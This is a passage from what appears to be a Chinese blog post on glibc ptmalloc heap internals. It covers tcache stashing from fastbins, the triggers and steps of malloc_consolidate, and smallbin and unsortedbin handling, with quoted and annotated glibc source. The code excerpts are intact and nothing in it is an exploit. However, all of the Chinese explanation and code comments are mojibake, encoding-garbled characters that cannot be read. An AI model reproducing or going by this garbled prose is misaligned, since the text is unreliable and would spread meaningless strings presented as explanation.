<p>åœ¨æœ¬æ¬¡åˆ†é…è¯·æ±‚æ‹¿åˆ°å †å—ä¹‹å,åœ¨è¿”å›ä¹‹å‰,è¿˜ä¼šå…ˆå°è¯•æŠŠ<code>fastbin</code>ä¸­çš„å‰©ä½™çš„åŒæ ·å¤§å°çš„å †å—ç¼“å­˜åˆ°<code>tcache</code>ä¸­,ç›´åˆ°<code>tcache</code>å¡æ»¡æˆ–è€…<code>fastbin</code>ç©º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE                              <span class="comment">//å¦‚æœä½¿ç”¨tcache, ä¸‹é¢è¦æŠŠfastbinä¸­çš„å †å—å°è¯•ç¼“å­˜è¿›å…¥tcache,ä¸ºä¸‹ä¸€æ¬¡åˆ†é…åŠ é€Ÿ</span></span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">            <span class="type">size_t</span> tc_idx = csize2tidx(nb);                             <span class="comment">//è®¡ç®—nbå¤§å°çš„å †å—,åœ¨tcacheä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)                     <span class="comment">//åˆ¤æ–­æ˜¯å¦åœ¨tcacheèŒƒå›´ä¸­</span></span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//æ£€æŸ¥tcacheå¯¹åº”æ¡¶æ˜¯å¦æœ‰ç©ºé—´</span></span><br><span class="line">                &#123;<span class="comment">//whileç»ˆæ­¢çš„æ¡ä»¶,è¦ä¹ˆæ˜¯tcacheè¢«ç‹ ç‹ å¡æ»¡äº†,è¦ä¹ˆæ˜¯fastbinä¸€æ»´ä¹Ÿä¸å‰©äº†</span></span><br><span class="line">                    <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(tc_victim)))</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = REVEAL_PTR(tc_victim-&gt;fd);									</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely(tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put(tc_victim, tc_idx);<span class="comment">//å†å¡ä¸€ä¸ª</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h5 id="malloc_consolidate">malloc_consolidate</h5>
<p>ç”±äºfastbinsä¸­çš„å †å—ä¸ä¼šè¢«åˆå¹¶,å¤„äºä¸€ç§ä¸å½»åº•é‡Šæ”¾çš„çŠ¶æ€,å¯èƒ½å¯¼è‡´å¤–éƒ¨ç¢ç‰‡å¢åŠ ,æ¯”å¦‚å‡è®¾æŸä¸€æ—¶åˆ»å †å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[64B @ smallbins][16B @ fastbins][64B @ smallbins]</span><br></pre></td></tr></table></figure>
<p>æ€»è®¡æœ‰<code>144B</code>çš„ç©ºé—²å†…å­˜ç©ºé—´</p>
<p>å¯¹äºä¸€ä¸ª<code>128B</code>çš„è¯·æ±‚,
å´å› ä¸ºä¸­é—´<code>fastbins</code>ä¸­çš„å †å—ä¸èƒ½è¢«åˆå¹¶,è€Œå¾—ä¸åˆ°æ»¡è¶³</p>
<p>å› æ­¤<code>malloc_consolidate</code>å‡½æ•°çš„èŒè´£,å°±æ˜¯é€‚æ—¶æ¸…ç†<code>fastbins</code>,å°è¯•åˆå¹¶å‡ºå¤§è¥¿ç“œæ¥,å‡å°‘å¤–éƒ¨ç¢ç‰‡</p>
<blockquote>
<p>å¤–éƒ¨ç¢ç‰‡:</p>
<p>å¤šæ¬¡æ— è§„å¾‹çš„åˆ†é…ä¸é‡Šæ”¾ä¹‹åå †å†…å­˜ä¸­å‡ºç°å¾ˆå¤šå°ç©ºæ´,</p>
<p>å°ç©ºæ´å¯èƒ½åŠ èµ·æ¥æœ‰è¾ƒå¤§çš„ç©ºé—´,ä½†æ˜¯å®é™…ä¸Šä¸è¿ç»­,ä¸èƒ½æ»¡è¶³ä¸€ä¸ªçœŸæ­£çš„å¤§ç©ºé—´ç”³è¯·</p>
<p>å†…éƒ¨ç¢ç‰‡:</p>
<p>å› ä¸ºå…ƒæ•°æ®ä»¥åŠå¯¹é½å› ç´ ,å¯¼è‡´å †å—å®é™…å¤§å°å¤§äºæ‰€éœ€å¤§å°æ‰€é€ æˆçš„å†…å­˜æµªè´¹</p>
</blockquote>
<p><strong>malloc_consolidateå‘ç”Ÿæ—¶æœº</strong></p>
<p><code>malloc_consolidate</code>ç”¨äºæ¸…æ‰«<code>fastbins</code>ä¸­çš„é»‘æˆ·</p>
<p>å¯èƒ½å‘ç”Ÿçš„æ—¶æœº:</p>
<p>1.<code>malloc</code>è¯·æ±‚ä¸èƒ½åœ¨<code>tcache,fastbins,smallbins</code>ä¸­å¾—åˆ°æ»¡è¶³,å¹¶ä¸”æ­¤æ—¶<code>fastbins</code>ä¸­è‡³å°‘æœ‰ä¸€ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))		<span class="comment">//å½“fastbinä¸­ä¸€æ—¦æœ‰å †å—,av-&gt;have_fastchunkså°±ä¼šè¢«ç½®ä½</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>2.å½“ä½¿ç”¨<code>topchunk</code>è¿›è¡Œåˆ†é…<strong>ä»æ— æ³•æ»¡è¶³</strong>æ—¶,è€ƒè™‘åˆ°<code>fastbins</code>ä¸­çš„å †å—å¯èƒ½åˆå¹¶åˆ°<code>topchunk</code>,ä»¥æ‰©å¤§<code>topchunk</code>,å¯èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚,å› æ­¤æ­¤æ—¶ä¹Ÿä¼šå°è¯•</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">      &#123;</span><br><span class="line">	...<span class="comment">//ä½¿ç”¨topchunkå¯ä»¥æ»¡è¶³éœ€æ±‚</span></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">       here for all block sizes.  */</span></span><br><span class="line"><span class="comment">//topchunkæ— æ³•ç›´æ¥æ»¡è¶³éœ€æ±‚,å°è¯•å°†fastbinsä¸­çš„é»‘æˆ·åˆå¹¶åˆ°topchunk,åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯æ—¶é‡æ–°å°è¯•ä½¿ç”¨topchunkåˆ†é…</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      &#123;</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">        <span class="comment">/* restore original bin index */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">          idx = smallbin_index (nb);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          idx = largebin_index (nb);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//åˆ°æ­¤è¯´æ˜fastbinså·²ç»å…¨æ€äº†,å¦‚æœè¿˜ä¸èƒ½æ»¡è¶³åˆ†é…éœ€æ±‚,è¯´æ˜ptmallocå·²ç»æ‰è¥Ÿè§è‚˜äº†,éœ€è¦ç³»ç»Ÿè°ƒç”¨brk,ç»™å †åŒºæ‰©å®¹äº†</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>3.åœ¨<code>free</code>æ—¶å¦‚æœé‡Šæ”¾çš„å †å—éå¸¸å¤§,å¤§äº<code>65536</code>ä¸ªå­—èŠ‚,ä¹Ÿå°±æ˜¯<code>64KB</code>,å¹¶ä¸”æ­¤æ—¶<code>fastbins</code>ä¸­æœ‰ä¸œè¥¿,ä¹Ÿä¼šå‘ç”Ÿ,ç›®çš„æ˜¯æŠŠ<code>fastbins</code>ä¸­çš„é»‘æˆ·æ€äº†,èƒ½åˆå¹¶åˆ°è¿™ä¸ªå¤§å—å„¿çš„å°±åˆå¹¶,ç„¶åè°ƒç”¨<code>munmap</code>ç¼©å‡å †åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4.<code>malloc_trim</code>è¢«è°ƒç”¨æ—¶,å­å‡½æ•°<code>mtrim</code>ä¼šè¿›è¡Œ<code>malloc_consolidate</code>,è¿™ä¸ª<code>malloc_trim</code>ä½œç”¨æ˜¯å‰Šå‡å †åŒºç©ºé—´è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿ</p>
<blockquote>
<p>ç„¶è€Œåœ¨glibcä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°è¯¥å‡½æ•°çš„è°ƒç”¨è€…,å¯èƒ½æ˜¯æä¾›ç»™å¼€å‘è€…æ‰‹åŠ¨ç®¡ç†å†…å­˜ç”¨çš„</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">mtrim (mstate av, size_t pad)</span><br><span class="line">&#123;</span><br><span class="line">  /* Ensure all blocks are consolidated.  */</span><br><span class="line">  malloc_consolidate (av);</span><br></pre></td></tr></table></figure>
<p><strong>malloc_consolidateçš„æ•ˆæœ</strong></p>
<p>é›¶å¸§èµ·æ‰‹,ç›´æ¥å®£åˆ¤<code>fastbins</code>ä¸­çš„å †å—æ­»åˆ‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>æ„æ€æ˜¯æœ¬å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹å,<code>fastbins</code>ä¸­å°†æ— äººç”Ÿè¿˜</p>
<p>å…·ä½“å¹²äº†å•¥å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ä»å°åˆ°å¤§éå†fastbinsä¸­çš„10ä¸ªæ¡¶å­,å¯¹äºæ¯ä¸ªæ¡¶å­:</span><br><span class="line">	å¦‚æœæ¡¶å­ä¸ºç©ºåˆ™continue</span><br><span class="line">	å¦‚æœæ¡¶å­ä¸ç©º:</span><br><span class="line">		éå†è¯¥æ¡¶å­ä¸ŠæŒ‚çš„æ¯ä¸ªå †å—,å¯¹äºæ¯ä¸ªå †å—:</span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„å‰å—ç©ºé—² åˆ™:</span><br><span class="line">				å‘å‰åˆå¹¶,å¹¶å°†å‰å—ä»å…¶æ‰€åœ¨binä¸­unlinkæ‹†ä¸‹æ¥</span><br><span class="line"></span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„åå—ä¸æ˜¯topchunk åˆ™:</span><br><span class="line">				å¦‚æœè¯¥åå—ç©ºé—² åˆ™:</span><br><span class="line">					æŠŠåå—ä»å…¶æ‰€åœ¨binä¸­unlinkæ‹†ä¸‹æ¥,</span><br><span class="line">					å½“å‰å—å‘ååˆå¹¶</span><br><span class="line">				å¦‚æœåå—æ­£åœ¨ä½¿ç”¨ åˆ™:</span><br><span class="line">					åå—çš„Pæ ‡å¿—å½’é›¶</span><br><span class="line">				æŒ‚åˆ°unsortedbinä¸Š</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			Â· å¦‚æœç‰©ç†ä¸Šç›¸é‚»çš„åå—æ˜¯topchunk åˆ™:</span><br><span class="line">				åˆå¹¶åˆ°topchunk</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin(av, <span class="number">0</span>);   <span class="comment">//è¿­ä»£éå†fastbinsä¸­çš„æ¯ä¸ªæ¡¶å­,ä»ç¬¬0ä¸ªæ¡¶å­å¼€å§‹,åˆ°æœ€åä¸€ä¸ª</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;       <span class="comment">//ä»å°åˆ°å¤§éå†fastbinsä¸­çš„10ä¸ªæ¡¶å­</span></span><br><span class="line">    p = atomic_exchange_acq(fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>)     <span class="comment">//æ¡¶å­éç©º</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(p)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">                                    <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(chunksize(p));</span><br><span class="line">                <span class="keyword">if</span> ((&amp;fastbin(av, idx)) != fb)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_inuse_chunk(av, p);</span><br><span class="line">            nextp = REVEAL_PTR(p-&gt;fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">            size = chunksize(p);</span><br><span class="line">            nextchunk = chunk_at_offset(p, size);</span><br><span class="line">            nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">//å°è¯•å‘å‰åˆå¹¶</span></span><br><span class="line">            &#123;</span><br><span class="line">                prevsize = prev_size(p);</span><br><span class="line">                size += prevsize;</span><br><span class="line">                p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">                unlink_chunk(av, p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//å°è¯•å‘ååˆå¹¶</span></span><br><span class="line">            &#123;</span><br><span class="line">                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">                &#123;</span><br><span class="line">                    size += nextsize;</span><br><span class="line">                    unlink_chunk(av, nextchunk);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                first_unsorted = unsorted_bin-&gt;fd;  <span class="comment">//æŒ‚åˆ°unsortedbinä¸Š</span></span><br><span class="line">                unsorted_bin-&gt;fd = p;</span><br><span class="line">                first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                p-&gt;bk = unsorted_bin;</span><br><span class="line">                p-&gt;fd = first_unsorted;</span><br><span class="line">                set_foot(p, size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">//åˆå¹¶åˆ°topchunk</span></span><br><span class="line">            &#123;</span><br><span class="line">                size += nextsize;</span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                av-&gt;top = p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å°æ–Œsmallbins">å°æ–ŒSmallbins</h3>
<p><code>bin_at(M,2~63)</code>è¿™ä¸ªèŒƒå›´æ˜¯å°æ–Œ</p>
<h4 id="datastructure-1">datastructure</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213732598.png"
alt="image-20241026213732598" />
<figcaption aria-hidden="true">image-20241026213732598</figcaption>
</figure>
<p>å¸¦é™„åŠ å¤´èŠ‚ç‚¹çš„åŒå‘å¾ªç¯é“¾è¡¨</p>
<p>æ¡¶å­å¤´åˆ°å †å—çš„æŒ‡é’ˆæ˜¯è£¸éœ²çš„</p>
<p>å †å—ä¹‹é—´çš„æŒ‡é’ˆæ˜¯åŠ äº†å¯†çš„,çœŸæ˜¯åŠ äº†ç§æƒ</p>
<h4 id="algorithm-2">algorithm</h4>
<p>å°æ–Œå¯èƒ½å»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.ä½¿ç”¨<code>malloc</code>æ—¶,å¦‚æœè½®åˆ°ä¹±æ–Œå‡ºåŠ›,å¦‚æœä¹±æ–Œå‘ç°è‡ªå·±ç®¡ç†çš„å †å—å®é™…ä¸Šæ˜¯å°æ–Œçš„èŒƒå›´,ä¹±æ–Œä¼šæ‰”ç»™å°æ–Œ</p>
<h5 id="malloc-1">malloc</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png"
alt="malloc beyond tcache" />
<figcaption aria-hidden="true">malloc beyond tcache</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)					<span class="comment">//è‡³å°‘æœ‰ä¸€å—</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))        <span class="comment">//ç±»fastbinæ£€æŸ¥DFçš„å”æ°æ–¹æ³•</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE              <span class="comment">//ç±»ä¼¼äºfastbinä½¿ç”¨tcacheç¼“å†²çš„æ–¹æ³•</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸è€ƒè™‘tcache,é‚£ä¹ˆç›¸åº”ä¸€æ¬¡mallocè¯·æ±‚ä¹‹å,smallbiné•¿è¿™æ ·:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213926914.png"
alt="image-20241026213926914" />
<figcaption aria-hidden="true">image-20241026213926914</figcaption>
</figure>
<h3 id="ä¹±æ–Œunsortedbin">ä¹±æ–ŒUnsortedbin</h3>
<h4 id="algorithm-3">algorithm</h4>
<p>ä¹±æ–Œæ˜¯æ–Œå®¶çš„è¿›å£éƒ¨é•¿,å¤§æ–Œå’Œå°æ–Œçš„è´§,éƒ½æ˜¯ä¹±æ–Œç»™çš„</p>
<p>ä¹±æ–Œå¯èƒ½ä»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.å½“<code>fastbins</code>ä¸­è§¦å‘äº†<code>malloc_consolidate</code>ä¹‹å,å¦‚æœå †å—æ²¡æœ‰è¢«åˆå¹¶åˆ°<code>topchunk</code>
,é‚£ä¹ˆå…¶å½’å®¿å°±æ˜¯<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">...</span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
